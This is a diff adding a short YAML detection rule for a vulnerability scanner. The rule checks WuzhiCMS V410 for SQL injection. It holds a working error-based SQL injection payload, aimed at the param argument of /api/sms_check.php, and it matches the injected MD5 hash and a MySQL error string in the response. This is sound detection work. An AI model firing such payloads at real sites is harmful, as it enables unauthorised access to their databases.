@@ -1,0 +1,15 @@
+id: wuzhicms-v410-sqli
+
+info:
+    name: WuzhiCMS V410 sqli
+    author: leezp
+    severity: high
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20
+        expression: response.status == 200 && response.body.bcontains(b"81dc9bdb52d04dc20036dbd8313ed05") && response.body.bcontains(b"sql_error:MySQL Query Error")
+expression: r0()
+
